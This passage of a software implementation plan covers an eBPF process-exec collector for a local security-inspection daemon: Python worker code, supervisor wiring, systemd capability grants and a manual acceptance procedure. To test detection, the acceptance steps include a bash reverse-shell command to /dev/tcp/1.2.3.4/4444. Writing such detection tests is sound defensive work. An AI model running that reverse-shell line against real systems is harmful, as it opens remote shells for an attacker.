    def _record_to_event(self, record: dict[str, Any]) -> dict[str, Any]:
        ts_ns = int(record["timestamp_ns"]) + self._wall_offset_ns
        observed_at = datetime.fromtimestamp(ts_ns / 1e9, tz=UTC).isoformat()

        return {
            "event_id": str(uuid.uuid4()),
            "observed_at": observed_at,
            "module": "process_collector",
            "action": "process_start",
            "severity": "info",
            "host": {"name": self._host_name},
            "actor": {
                "user": {
                    "id": str(record["uid"]),
                },
            },
            "process": {
                "pid": int(record["pid"]),
                "name": str(record["comm"]),
                "command_line": str(record["cmdline"]),
                "parent": {"pid": int(record["ppid"])} if record["ppid"] else {},
            },
            "raw": {"source": "ebpf:sched_process_exec"},
        }


def _open_sink(arg: str) -> IO[bytes]:
    if arg == "-":
        return sys.stdout.buffer
    return Path(arg).open("ab")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="inspectord-process-collector",
        description="eBPF process-exec collector; writes NDJSON Events to a sink.",
    )
    parser.add_argument(
        "--sink-path",
        default="-",
        help="Path to write NDJSON events (default: stdout, '-' = stdout)",
    )
    parser.add_argument(
        "--poll-timeout-ms",
        type=int,
        default=200,
        help="Ring-buffer poll timeout per iteration",
    )
    args = parser.parse_args(argv)

    sink = _open_sink(args.sink_path)
    worker = ProcessCollectorWorker(sink=sink)
    worker.start()
    try:
        while True:
            worker.step(poll_timeout_ms=args.poll_timeout_ms)
    except KeyboardInterrupt:
        pass
    finally:
        worker.stop()
        if sink not in (sys.stdout.buffer, sys.stderr.buffer):
            sink.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

- [ ] **Step 5: Run the test**

```bash
pytest tests/workers/test_process_collector_worker.py -v
```

Expected: 3 passed.

Full Python suite:

```bash
pytest -m "not ebpf_load" tests/ -v
```

Expected: 278 passed (275 prior + 3 new).

Lint chain:

```bash
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

- [ ] **Step 6: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-10-process-collector-worker
git add inspectord/workers/process_collector/ tests/workers/
git commit -m "feat(process_collector): worker translates eBPF records to process_start Events"
git push -u origin task-bpf-10-process-collector-worker
gh pr create --base main --head task-bpf-10-process-collector-worker \
  --title "feat(process_collector): worker emits process_start Events" \
  --body "Adds inspectord.workers.process_collector — a worker that polls ProcessExecStream and writes one normalized process_start Event per eBPF record. Unit tests inject a FakeStream so no real BPF load is needed. Wiring into the supervisor + dev_config happens in PR 11."
```

Wait for CI green; do NOT merge.

---

## Task 11: Supervisor wiring + dev_config + systemd capabilities

**Files:**
- Modify: `inspectord/config.py` (add process_collector worker to dev_config)
- Modify: `packaging/systemd/inspectord.service.template` (add CAP_BPF, CAP_PERFMON, CAP_SYS_PTRACE)
- Create: `tests/test_dev_config_process_collector.py`

**Branch:** `task-bpf-11-supervisor-wiring`

Spawn the worker via the supervisor when `inspectord --dev` runs. Grant BPF capabilities in the systemd unit.

- [ ] **Step 1: Failing test**

Write `/home/eli/Development/inspectord/tests/test_dev_config_process_collector.py`:

```python
"""dev_config must include a process_collector worker entry."""

from __future__ import annotations

from pathlib import Path


def test_dev_config_contains_process_collector(tmp_path: Path) -> None:
    from inspectord.config import dev_config

    cfg = dev_config(base=tmp_path)

    worker_names = [w.name for w in cfg.workers]
    assert "process_collector" in worker_names, worker_names

    worker = next(w for w in cfg.workers if w.name == "process_collector")
    cmd = list(worker.command)
    assert any(c.endswith("python") or c == "python" or c == "python3" for c in cmd[:1]), cmd
    assert "-m" in cmd, cmd
    assert "inspectord.workers.process_collector" in cmd, cmd
    assert "--sink-path" in cmd, cmd
```

- [ ] **Step 2: Run the failing test**

```bash
pytest tests/test_dev_config_process_collector.py -v
```

Expected: AssertionError — process_collector not in worker list.

- [ ] **Step 3: Inspect existing dev_config to copy the pattern**

```bash
grep -n "WorkerConfig\|name=" /home/eli/Development/inspectord/inspectord/config.py | head -40
```

Look at an existing entry (`log_tailer`, `fim_watcher`, or `dependency_manager`) to confirm the exact `WorkerConfig` field names. Read the file's `dev_config` function and add an entry for `process_collector` after the last existing worker. The shape:

```python
        WorkerConfig(
            name="process_collector",
            command=[
                sys.executable,
                "-m",
                "inspectord.workers.process_collector",
                "--sink-path",
                str(base / "journal" / "process_collector.ndjson"),
            ],
            restart_policy="on-failure",
            env={},
        ),
```

If the existing pattern uses different field names (e.g., `args` instead of `command`, or `restart` instead of `restart_policy`), match them. The test is intentionally tolerant — it only asserts the command shape.

- [ ] **Step 4: Run the test**

```bash
pytest tests/test_dev_config_process_collector.py -v
```

Expected: 1 passed.

Full suite:

```bash
pytest -m "not ebpf_load" tests/ -v
```

Expected: 279 passed (278 + 1).

- [ ] **Step 5: Update the systemd unit to grant capabilities**

Read `/home/eli/Development/inspectord/packaging/systemd/inspectord.service.template` and find the `[Service]` block. Add:

```ini
AmbientCapabilities=CAP_BPF CAP_PERFMON CAP_SYS_PTRACE
CapabilityBoundingSet=CAP_BPF CAP_PERFMON CAP_SYS_PTRACE
```

The full `[Service]` block should look approximately like:

```ini
[Service]
Type=simple
ExecStart=@PYTHON@ -m inspectord
Restart=on-failure
RestartSec=5s
AmbientCapabilities=CAP_BPF CAP_PERFMON CAP_SYS_PTRACE
CapabilityBoundingSet=CAP_BPF CAP_PERFMON CAP_SYS_PTRACE
```

(Preserve any other directives — `User=`, `Group=`, `WorkingDirectory=`, etc.)

- [ ] **Step 6: Manual end-to-end smoke check (run by hand, not CI)**

```bash
sudo /home/eli/Development/inspectord/.venv/bin/python -m inspectord --dev --base /tmp/inspd-test &
sleep 3
ls -la /tmp >/dev/null
sleep 1
cat /tmp/inspd-test/journal/process_collector.ndjson | head -5
```

Expected: NDJSON lines for the `ls` exec, with `process.command_line` containing `ls -la /tmp`.

Cleanup:

```bash
sudo killall -INT python || true
rm -rf /tmp/inspd-test
```

- [ ] **Step 7: Lint chain**

```bash
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
```

- [ ] **Step 8: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-11-supervisor-wiring
git add inspectord/config.py packaging/systemd/inspectord.service.template tests/test_dev_config_process_collector.py
git commit -m "feat(supervisor): wire process_collector into dev_config + grant CAP_BPF in systemd unit"
git push -u origin task-bpf-11-supervisor-wiring
gh pr create --base main --head task-bpf-11-supervisor-wiring \
  --title "feat(supervisor): spawn process_collector + grant CAP_BPF" \
  --body "Adds a WorkerConfig entry for process_collector to dev_config so 'inspectord --dev' launches the eBPF worker. Updates the systemd unit template to include AmbientCapabilities=CAP_BPF CAP_PERFMON CAP_SYS_PTRACE so the production install can load BPF programs."
```

Wait for CI green; do NOT merge.

---

## Task 12: End-to-end acceptance + spec bump to v0.3.0 (Phase 2 opens)

**Files:**
- Create: `docs/manual-acceptance/process-collector-acceptance.md`
- Modify: `docs/superpowers/specs/2026-05-24-local-inspection-design.md` (bump to v0.3.0 + changelog entry)
- Commit (already on disk): `docs/superpowers/plans/2026-05-25-process-collector-ebpf.md`

**Branch:** `task-bpf-12-acceptance-and-spec`

Final PR of the slice. Manual acceptance procedure, spec bump to v0.3.0, commit the plan doc.

- [ ] **Step 1: Write the manual acceptance doc**

```bash
mkdir -p /home/eli/Development/inspectord/docs/manual-acceptance
```

Write `/home/eli/Development/inspectord/docs/manual-acceptance/process-collector-acceptance.md`:

````markdown
# process_collector — manual acceptance

End-to-end verification: from a kernel exec event, through the BPF ring buffer,
the Rust loader, the Python worker, the supervisor / enricher / rule-engine
pipeline, to a real Alert visible in `inspectorctl alerts list`.

## Prerequisites

- Linux 6.x x86_64 (hard-coded task_struct offsets target this).
- Root (CAP_BPF + CAP_PERFMON + CAP_SYS_PTRACE).
- Editable install: `pip install -e '.[dev]' --no-build-isolation`.

## Procedure

1. Start the daemon in dev mode:

   ```bash
   sudo /home/eli/Development/inspectord/.venv/bin/python -m inspectord --dev \
       --base /tmp/inspd-accept &
   ```

   Wait ~3 seconds for workers to start.

2. In another terminal, trigger the LOLBin reverse-shell pattern (the listening
   side does not need to exist):

   ```bash
   timeout 1 bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 || true
   ```

3. Wait 2 seconds for the rule engine to fire.

4. Query alerts:

   ```bash
   /home/eli/Development/inspectord/.venv/bin/inspectorctl \
       --socket /tmp/inspd-accept/var/inspectord.sock alerts list
   ```

   Expected output:

   ```
   id          when                     severity  rule                  process            host
   ----------  -----------------------  --------  --------------------  -----------------  --------
   <uuid>      2026-05-25T..:..:..Z     high      lolbin.bash_dev_tcp   bash (<pid>)       <hostname>
   ```

5. Optional: open the web dashboard:

   ```bash
   /home/eli/Development/inspectord/.venv/bin/inspectorctl-web \
       --socket /tmp/inspd-accept/var/inspectord.sock --port 8765 &
   xdg-open http://127.0.0.1:8765/alerts
   ```

6. Cleanup:

   ```bash
   sudo killall -INT python || true
   rm -rf /tmp/inspd-accept
   ```

## Troubleshooting

- **`process_collector` keeps restarting**: check supervisor log for "permission
  denied" — confirm sudo or AmbientCapabilities.
- **No alert fires** but journal has records: `inspectorctl rules list` should
  show `lolbin.bash_dev_tcp` as `active`.
- **No records in the journal**: hard-coded task_struct offsets may be wrong
  for your kernel. Run
  `bpftool btf dump file /sys/kernel/btf/vmlinux format c | grep -A300 'struct task_struct '`
  and verify offsets. A CO-RE BTF migration is on the Phase 2 roadmap.
````

- [ ] **Step 2: Bump the spec to v0.3.0**

In `/home/eli/Development/inspectord/docs/superpowers/specs/2026-05-24-local-inspection-design.md`:

1. Change `Spec version` header from `0.2.4` to `0.3.0`.

2. Append at the bottom of the changelog table:

   ```
   | 0.3.0 | 2026-05-25 | **Phase 2 opens.** process_collector v1: eBPF sched_process_exec tracepoint via aya + bpf-linker + maturin/PyO3. Streams ProcessExecRecord (pid, ppid, uid, gid, comm, cmdline up to 256 bytes) through a 256-KiB ring buffer. ProcessCollectorWorker emits process_start Events; lolbin.bash_dev_tcp rule now fires on real bash invocations. systemd unit gains CAP_BPF/CAP_PERFMON/CAP_SYS_PTRACE. Build backend migrated hatchling → maturin. task_struct offsets currently hard-coded for Linux 6.x x86_64 — CO-RE BTF relocations slated for next Phase 2 slice. Remaining process_collector tracepoints (sched_process_exit, sys_enter_ptrace, sys_enter_finit_module, raw-socket creation) deferred. |
   ```

3. Update §31 (Phase Roadmap) — annotate `process_collector` with "**started v0.3.0 (sched_process_exec only)**".

- [ ] **Step 3: Sanity (all gates)**

```bash
pytest -m "not ebpf_load" tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace --all-targets
```

Expected: 279 passed; all gates green.

- [ ] **Step 4: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-12-acceptance-and-spec
git add docs/manual-acceptance/process-collector-acceptance.md \
        docs/superpowers/specs/2026-05-24-local-inspection-design.md \
        docs/superpowers/plans/2026-05-25-process-collector-ebpf.md
git commit -m "docs: process_collector manual acceptance + spec v0.3.0 (Phase 2 opens)"
git push -u origin task-bpf-12-acceptance-and-spec
gh pr create --base main --head task-bpf-12-acceptance-and-spec \
  --title "docs: process_collector acceptance + spec v0.3.0" \
  --body "Closes the Phase 2 v1 slice. The process_collector worker is now wired end-to-end: kernel sched_process_exec → BPF ring buffer → Rust loader → Python worker → enricher → rule_engine → Alert. Spec bumped to v0.3.0 — Phase 2 is now open."
```

Wait for CI green; do NOT merge.

---

## What is NOT in this plan (subsequent Phase 2 slices)

Intentionally deferred:

- **CO-RE BTF relocations** to replace the hard-coded `task_struct` offsets. Required for portability across kernel versions and architectures.
- `sched_process_exit` tracepoint to populate `process_end` Events (lets the rule engine correlate exec↔exit pairs).
- `sys_enter_ptrace`, `sys_enter_finit_module`, raw-socket creation tracepoints.
- `auditd` fallback for the `minimal` profile.
- Cmdline truncation indicator in the Event (`process.command_line_truncated: bool`).
- Parent enrichment: only `parent.pid` is populated by the collector; the existing process_enricher should fill `parent.name` / `parent.command_line` by reading `/proc/<ppid>/`. Verify during acceptance; if missing, a tiny follow-up adds it to `enrichment/process.py`.

## Acceptance criteria — slice is complete when all true

- [ ] PRs 1–12 all merged into `main`.
- [ ] `cargo build --release --target bpfel-unknown-none -p inspectord_ebpf_process_bpf` produces a BPF object on a clean checkout.
- [ ] `pip install -e '.[dev]' --no-build-isolation` produces a working install that includes the `inspectord._native` extension.
- [ ] `pytest -m "not ebpf_load" tests/` reports 279 passed.
- [ ] `sudo pytest -m ebpf_load tests/` reports 1 passed (the cmdline round-trip test).
- [ ] Running the manual acceptance procedure end-to-end produces a `lolbin.bash_dev_tcp` Alert.
- [ ] CI is green on `main` after PR 12 merges.
- [ ] Spec at v0.3.0 with the Phase 2 changelog entry.
